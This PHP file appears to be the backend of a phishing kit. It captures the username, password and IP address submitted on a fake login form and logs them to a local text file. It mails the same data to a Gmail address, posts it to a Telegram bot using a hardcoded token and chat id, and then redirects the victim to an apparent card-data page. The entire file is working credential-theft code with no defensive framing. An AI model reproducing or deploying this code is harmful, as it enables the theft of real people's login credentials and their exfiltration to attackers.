<?php
error_reporting(-1);
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['username']) and !empty($_POST['password'])
    ) {
            $_SESSION['username']=$_POST['username'];
            $_SESSION['password']=$_POST['password'];

          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $Ak47  = "LOG Chlada\n";
            $Ak47 .= "--------------------\n";
            $Ak47 .= "LOG: ".$_SESSION['username']."\n";
            $Ak47 .= "PASS: ".$_SESSION['password']."\n";
            $Ak47 .= "IP ".$ip."\n";

            $file = fopen("./useragent.txt", "a+");
            fwrite($file, $Ak47);
            fclose($file);
            $to = "devbox00@gmail.com";
            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (1ST)";
            $headers = "From: Ak47.BUlLETSâ„¢<shanks@dPortgas.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $Ak47, $headers);
            file_get_contents("https://api.telegram.org/bot1226896715:AAEzvpOBp0G0E7b-9FCd-50OJMiXY1IyLhM/sendMessage?chat_id=1298082336&text=" . urlencode($Ak47)."" ); //shanks   
            
       



        
        header('Location: ../sd/cc.html');    
        
    }
}
?>